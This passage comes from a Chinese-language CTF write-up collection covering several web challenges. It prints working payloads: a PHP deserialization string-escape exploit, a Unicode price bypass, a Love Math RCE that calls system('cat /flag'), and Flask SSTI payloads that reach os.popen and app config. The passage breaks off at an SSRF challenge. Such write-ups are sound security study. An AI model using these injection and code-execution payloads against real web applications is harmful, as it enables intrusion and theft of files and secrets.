href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));<span class="comment">//把序列化后的$_SESSION用filter函数过滤</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

知识点：反序列化字符串逃逸。extract()变量覆盖

$_SESSION是访客与整个网站交互过程中一直存在的公有变量。

 extract($_POST)就是将post的内容作为这个函数的参数。

然后就是变量覆盖。**如果post传参为`_SESSION[flag]=123`，那么`$_SESSION["user"]`和`$_SESSION["function"]`的值都会被覆盖**。

至于为什么post要传`_SESSION[flag]=123`而不是`$_SESSION[flag]=123`，是因为`_SESSION`是变量名，如果传`$_SESSION`，那么就会失效。

先?f=phpinfo看看能找到什么东西。

![image-20220514222327568](./buu/image-20220514222327568.png)

flag在/d0g3_fllllllag里面，所以再读/d0g3_fllllllag。

所以就有可能要通过最后一个语句来打开查看这个文件。

如果直接进行变量覆盖，直接给$SESSION['img']一个预想的值是不现实的，

因为$SESSION['img'] = base64_encode('guest_img.png')是在**extract($_POST);**这个函数之后执行的。

    if(!$_GET['img_path'])&#123;
        $_SESSION['img'] = base64_encode('guest_img.png');
    &#125;else&#123;
        $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
    &#125;

**所以我们看看另一个方向：fileter函数**

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#这部分代码就是将参数$img里面的跟上面数组里的字符串替换成空&#x27;&#x27;，然后返回替换之后的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

**php反序列化的对象逃逸**

任何具有一定结构的数据，只要经过了某些处理而把自身结构改变，则可能产生漏洞。

过滤函数分为两种情况：

**第一种为关键词数增加**

​		例如： where->hacker，这样词数由五个增加到6个。

**第二种为关键词数减少**

​		例如：直接过滤掉一些关键词，例如这道题目中。

​		过滤函数filter()是对serialize($_SESSION)进行过滤，滤掉一些关键字
 ​		那么我们有两种方法：

**键逃逸和值逃逸：**

原理:因为序列化后的字符串是严格的，对应的格式不能错，比如s:4:"name",那s:4就必须有一个字符串长度是4的否则就往后要。

并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。

示例：

<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;?</span>php</span><br><span class="line">#正规序列化的字符串</span><br><span class="line"><span class="variable">$a</span> <span class="operator">=</span> <span class="string">&quot;a:2:&#123;s:3:<span class="subst">\&quot;</span>one<span class="subst">\&quot;</span>;s:4:<span class="subst">\&quot;</span>flag<span class="subst">\&quot;</span>;s:3:<span class="subst">\&quot;</span>two<span class="subst">\&quot;</span>;s:4:<span class="subst">\&quot;</span>test<span class="subst">\&quot;</span>;&#125;&quot;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line">#带有多余的字符的字符串</span><br><span class="line"><span class="variable">$a_laji</span> <span class="operator">=</span> <span class="string">&quot;a:2:&#123;s:3:<span class="subst">\&quot;</span>one<span class="subst">\&quot;</span>;s:4:<span class="subst">\&quot;</span>flag<span class="subst">\&quot;</span>;s:3:<span class="subst">\&quot;</span>two<span class="subst">\&quot;</span>;s:4:<span class="subst">\&quot;</span>test<span class="subst">\&quot;</span>;&#125;;s:3:<span class="subst">\&quot;</span>真的垃圾img<span class="subst">\&quot;</span>;lajilaji&quot;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$a_laji</span>));</span><br><span class="line"># <span class="string">&quot;;s:3:<span class="subst">\&quot;</span>真的垃圾img<span class="subst">\&quot;</span>;lajilaji&quot;</span>;<span class="string">&quot;这些会被扔掉</span></span><br></pre></td></tr></table></figure>

如果我们把

$_SESSION['img'] = base64_encode('guest_img.png');这段代码的img属性放到花括号外边去，

然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。

那如何达到这个目的就要通过过滤函数了，因为咱的序列化的是个字符串啊，然后他又把黑名单的东西替换成空。

**键逃逸payload：**

这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对

 因为我们要让img的内容为d0g3_f1ag.phpbase64编码后的字符串，所以要传_SESSION[img]=;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;

因为在变量覆盖后面，又重新给$_SESSION[img]赋值了，失败，所以这个时候就要使用filter函数了，

如果我们传的是_SESSION[imgphp]=;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;

那么得到的是![image-20220514225026442](./buu/image-20220514225026442.png)

让s:6读取黄字部分

a:2:&#123;s:6:"img";s:40:";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";&#125;"

这样不就可以让后面的s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=="生效了吗？但是后面字符是10个，所以再加一个flag，构造为前面是10

我们试试构造一下，我们进行反序列化看看。

    <?php
    $a=unserialize('a:2:&#123;s:10:"img";s:40:";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";&#125;');
    print_r($a);
失败了：前面的a:2那里，如果我们这样构造的话，序列化内容就不满足a:2了。（即有两个元素）

前面加上：s:3:"123"

_SESSION[imgphpflag]=;s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;

得到：a:2:&#123;s:10:"img";s:50:";s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";&#125;

post:_SESSION[imgphpflag]=;s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;

得到：![image-20220514230536914](./buu/image-20220514230536914.png)

将这个base64:刚好还是20个:

![image-20220514230718452](./buu/image-20220514230718452.png)

## [ASIS 2019]Unicorn shop

知识点：Unicode欺骗

[unicode](https://www.compart.com/en/unicode)

输入前三个的Item ID会提示`Wrong commodity!`，如果Price输入超过一个字符会提示Only `one char(?) allowed!`。那这道题就是要尝试用一个字符来表示超过1377的数

![image-20220517130040487](./buu/image-20220517130040487.png)

![image-20220517130231163](buu/image-20220517130231163.png)

随便找一个超过1337的数

![image-20220517130302134](./buu/image-20220517130302134.png)

![image-20220517130315766](./buu/image-20220517130315766.png)

由于这题使用的是utf-8![image-20220517130342368](./buu/image-20220517130342368.png)

所以是：0xE2 0x86 0x82，还要把0x改成%

payload：%E2%86%82

## [CISCN 2019 初赛]Love Math

![image-20220517132652969](./buu/image-20220517132652969.png)

代码讲的意思是传入一个参数c长度不能大于等于80，然后有黑名单字符过滤，有白名单函数过滤

php中可以把函数名通过[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);

$a='system';
$a('ls');

<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">题目中有长度限制我们可以尝试构造<span class="symbol">$</span>_GET[]然后在传入想用的<span class="built_in">exp</span>，但是这里把中括号下划线禁用了，那么就得需要编码绕过了。</span><br><span class="line">通过白名单我们看到了一些可能帮助我们编码绕过的函数 base_convert ，dechex，第一个可以进行进制之间的转换，比如 base_convert(<span class="string">&quot;1001&quot;</span><span class="number">2</span>,<span class="number">10</span>)是将二进制的<span class="number">1001</span>转换为<span class="number">10</span>进制，第二个函数是将<span class="number">10</span>进制转成<span class="number">16</span>进制。</span><br><span class="line">我们先来写下我们要构造的payload：</span><br><span class="line"></span><br><span class="line">?c=<span class="symbol">$</span>_GET[a](<span class="symbol">$</span>_GET[b])&amp;a=<span class="keyword">system</span>&amp;b=cat flag</span><br><span class="line"></span><br><span class="line">好了，目的明确了，中括号被禁用我们可以用花括号代替&#123;&#125;，要构造的字符串为 _GET,php中有将<span class="number">16</span>进制转成字符串的函数hex2bin，那么hex2bin又怎么生成呢，这时就需要我们的base_convert函数了，<span class="number">36</span>进制也就是base36中有字母数字正好可以满足。</span><br><span class="line">所以 base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)=hex2bin。因为我们是要得到_GET所以就得用到另外一个函数dechex将_GET的<span class="number">10</span>进制转为<span class="number">16</span>进制再通过hex2bin转换为字符串</span><br><span class="line">所以_GET=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));</span><br><span class="line">好了我们已经可以构造出<span class="symbol">$</span>_GET[]了，那么直接将上面的payload修改下即可</span><br><span class="line"></span><br><span class="line">c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>&#123;<span class="built_in">pi</span>&#125;(<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="built_in">pi</span>=<span class="keyword">system</span>&amp;<span class="built_in">abs</span>=cat /flag</span><br><span class="line"></span><br></pre></td></tr></table>

## [WesternCTF2018]shrine

打开网站，查看源码看到下面的一串代码

> import flask//flask模板，首先就想到了想到了之前我写的一篇flask模板ssti逃逸
>
> import os
>
> app = flask.Flask(__name__)
>
> app.config['FLAG'] = os.environ.pop('FLAG')//注册了一个名为FLAG的config，这里基本可以确定是flag。
>
> @app.route('/')
>
> def index():
>
>   return open(__file__).read()
>
> @app.route('/shrine/<path:shrine>')//这里设置了shrine路由，这里可能会实现ssti
>
> def shrine(shrine):
>
>   def safe_jinja(s)://jinja模板
>
> ​    s = s.replace('(', '').replace(')', '')
>
> ​    blacklist = ['config', 'self']//设置黑名单
>
> ​    return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s//把黑名单的东西遍历并设为空
>
>   return flask.render_template_string(safe_jinja(shrine))//进行模块渲染
>
> if __name__ == '__main__':
>
>   app.run(debug=True)

根据源码就有了大致的思路就是在shrine目录下利用ssti漏洞，首先测试一下行不行。试一个经典&#123;&#123;7*7&#125;&#125;，发现可以

![image-20220517135009073](./buu/image-20220517135009073.png)

config 是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值

接下来就可以考虑在shrine下直接&#123;&#123;config&#125;&#125;即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号，但是python还有一个函数叫做url_for，其作用是url是用于构建指定函数的URL，在配合**globals()**，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果

<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">/shrine/</span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

![image-20220517135347205](./buu/image-20220517135347205.png)

current_app': <Flask 'app'>这里的current就是指的当前的app，这样我们只需要能查看到这个的config不就可以看到flag了，那么构造payload

<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">/shrine/</span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span></span><br></pre></td></tr></table></figure>

![image-20220517135528260](./buu/image-20220517135528260.png)

[ssti总结](https://blog.csdn.net/Manuffer/article/details/120739989)

类的知识总结

<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__class__</span>            类的一个内置属性，表示实例对象的类。</span><br><span class="line"><span class="variable">__base__</span>             类型对象的直接基类</span><br><span class="line"><span class="variable">__bases__</span>            类型对象的全部基类，以元组形式，类型的实例通常没有属性 <span class="variable">__bases__</span></span><br><span class="line"><span class="variable">__mro__</span>              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line"><span class="variable">__subclasses__</span>()     返回这个类的子类集合，Each class keeps a <span class="built_in">list</span> of weak references <span class="keyword">to</span> its immediate subclasses. This method returns a <span class="built_in">list</span> of all those references still <span class="built_in">alive</span>. The <span class="built_in">list</span> is <span class="built_in">in</span> definition order.</span><br><span class="line"><span class="variable">__init__</span>             初始化类，返回的类型是function</span><br><span class="line"><span class="variable">__globals__</span>          使用方式是 函数名.<span class="variable">__globals__</span>获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line"><span class="variable">__dic__</span>              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="variable">__dict__</span>里</span><br><span class="line"><span class="variable">__getattribute__</span>()   实例、类、函数都具有的<span class="variable">__getattribute__</span>魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用<span class="variable">__getattribute__</span>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line"><span class="variable">__getitem__</span>()        调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="string">&#x27;b&#x27;</span>]，就是a.<span class="variable">__getitem__</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="variable">__builtins__</span>         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。<span class="variable">__builtins__</span>与<span class="variable">__builtin__</span>的区别就不放了，百度都有。</span><br><span class="line"><span class="variable">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="variable">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line"><span class="variable">__str__</span>()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到<span class="variable">__builtins__</span>，而且url_for.<span class="variable">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到<span class="variable">__builtins__</span>，而且url_for.<span class="variable">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到<span class="variable">__builtins__</span>，而且lipsum.<span class="variable">__globals__</span>含有os模块：&#123;&#123;lipsum.<span class="variable">__globals__</span>[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.<span class="variable">__init__</span>.<span class="variable">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-<span class="built_in">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-<span class="built_in">Type</span>:a/b)</span><br><span class="line">request.json		 post传json  (Content-<span class="built_in">Type</span>: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.<span class="variable">__class__</span>.<span class="variable">__init__</span>.<span class="variable">__globals__</span>[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of <span class="string">&#x27;flask_ssti&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">ls来查看一下有哪些文件：/?<span class="built_in">flag</span>=&#123;&#123;config.<span class="variable">__class__</span>.<span class="variable">__init__</span>.<span class="variable">__globals__</span>[%<span class="number">27</span>os%<span class="number">27</span>].popen(%<span class="number">27</span>ls%<span class="number">27</span>).read()&#125;&#125;</span><br><span class="line">/?<span class="built_in">flag</span>=&#123;&#123;config.<span class="variable">__class__</span>.<span class="variable">__init__</span>.<span class="variable">__globals__</span>[%<span class="number">27</span>os%<span class="number">27</span>].popen(%<span class="number">27</span>cat%<span class="number">20</span><span class="built_in">flag</span>%<span class="number">27</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

常见过滤器

<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">常用的过滤器</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">()</span>：将值转换为<span class="title">int</span>类型；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">float</span><span class="params">()</span>：将值转换为<span class="title">float</span>类型；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">lower</span><span class="params">()</span>：将字符串转换为小写；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">upper</span><span class="params">()</span>：将字符串转换为大写；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">title</span><span class="params">()</span>：把值中的每个单词的首字母都转成大写；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">capitalize</span><span class="params">()</span>：把变量值的首字母转成大写，其余字母转小写；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">trim</span><span class="params">()</span>：截取字符串前面和后面的空白字符；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">wordcount</span><span class="params">()</span>：计算一个长字符串中单词的个数；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">reverse</span><span class="params">()</span>：字符串反转；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">replace</span><span class="params">(value,old,new)</span>： 替换将<span class="title">old</span>替换为<span class="title">new</span>的字符串；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">truncate</span><span class="params">(value,length=<span class="number">255</span>,killwords=False)</span>：截取<span class="title">length</span>长度的字符串；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">striptags</span><span class="params">()</span>：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">escape</span><span class="params">()</span>或<span class="title">e</span>：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：<span class="title">content</span>|<span class="title">escape</span>或<span class="title">content</span>|<span class="title">e</span>。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">safe</span><span class="params">()</span>： 禁用HTML转义，如果开启了全局转义，那么<span class="title">safe</span>过滤器会将变量关掉转义。示例： &#123;&#123;<span class="title">&#x27;</span>&lt;<span class="title">em</span>&gt;<span class="title">hello</span>&lt;/<span class="title">em</span>&gt;<span class="title">&#x27;</span>|<span class="title">safe</span>&#125;&#125;；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">list</span><span class="params">()</span>：将变量列成列表；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">string</span><span class="params">()</span>：将变量转换成字符串；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">join</span><span class="params">()</span>：将一个序列中的参数值拼接成字符串。示例看上面<span class="title">payload</span>；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">abs</span><span class="params">()</span>：返回一个数值的绝对值；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">first</span><span class="params">()</span>：返回一个序列的第一个元素；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">last</span><span class="params">()</span>：返回一个序列的最后一个元素；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">format</span><span class="params">(value,arags,*kwargs)</span>：格式化字符串。比如：&#123;&#123; &quot;%<span class="title">s</span>&quot; - &quot;%<span class="title">s</span>&quot;|<span class="title">format</span><span class="params">(&#x27;Hello?&#x27;,<span class="string">&quot;Foo!&quot;</span>)</span> &#125;&#125;将输出：H<span class="title">elloo</span>? - F<span class="title">oo</span>!</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">length</span><span class="params">()</span>：返回一个序列或者字典的长度；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">sum</span><span class="params">()</span>：返回列表内数值的和；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">sort</span><span class="params">()</span>：返回排序后的列表；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">default</span><span class="params">(value,default_value,boolean=false)</span>：如果当前变量没有值，则会使用参数中的值来代替。示例：<span class="title">name</span>|<span class="title">default</span><span class="params">(&#x27;xiaotuo&#x27;)</span>----如果<span class="title">name</span>不存在，则会使用<span class="title">xiaotuo</span>来替代。<span class="title">boolean</span>=F<span class="title">alse</span>默认是在只有这个变量为<span class="title">undefined</span>的时候才会使用<span class="title">default</span>中的值，如果想使用<span class="title">python</span>的形式判断是否为<span class="title">false</span>，则可以传递<span class="title">boolean</span>=<span class="title">true</span>。也可以使用<span class="title">or</span>来替换。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">length</span><span class="params">()</span>返回字符串的长度，别名是<span class="title">count</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

## [De1CTF 2019]SSRF Me

![image-20220517145145288](./buu/image-20220517145145288.png)

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 